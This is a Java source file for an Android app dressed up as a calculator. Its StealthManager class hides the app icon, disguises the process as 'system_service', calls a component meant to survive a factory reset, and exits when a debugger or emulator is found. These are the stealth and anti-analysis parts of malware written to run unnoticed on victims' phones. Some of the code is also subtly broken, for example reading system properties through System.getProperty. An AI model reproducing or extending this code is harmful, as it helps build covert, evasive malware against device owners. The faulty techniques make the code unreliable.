package com.calculator.professional;

import android.content.Context;
import android.content.ComponentName;
import android.content.pm.PackageManager;
import android.app.admin.DevicePolicyManager;
import android.os.Build;

public class StealthManager {
    
    public static void hideAppIcon(Context context) {
        try {
            PackageManager pm = context.getPackageManager();
            ComponentName componentName = new ComponentName(context, MainActivity.class);
            pm.setComponentEnabledSetting(componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void enableProcessHiding(Context context) {
        try {
            // Hide process name
            System.setProperty("java.util.prefs.PreferencesFactory", 
                "com.calculator.professional.HiddenPreferencesFactory");
            
            // Change process name
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                Process.setArgV0("system_service");
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void setupFormatResistance(Context context) {
        try {
            // Format resistance implementation
            FormatResistanceManager.setupResistance(context);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public static void enableAntiDetection(Context context) {
        try {
            // Anti-debugging measures
            enableAntiDebugging();
            
            // Anti-emulator detection
            enableAntiEmulator();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private static void enableAntiDebugging() {
        // Detect debugger attachment
        new Thread(() -> {
            while (true) {
                if (android.os.Debug.isDebuggerConnected()) {
                    System.exit(0);
                }
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    break;
                }
            }
        }).start();
    }
    
    private static void enableAntiEmulator() {
        // Detect emulator environment
        String[] emulatorProperties = {
            "ro.kernel.qemu",
            "ro.hardware",
            "ro.product.model"
        };
        
        for (String property : emulatorProperties) {
            String value = System.getProperty(property);
            if (value != null && (value.contains("goldfish") || 
                value.contains("emulator") || value.contains("sdk"))) {
                System.exit(0);
            }
        }
    }
}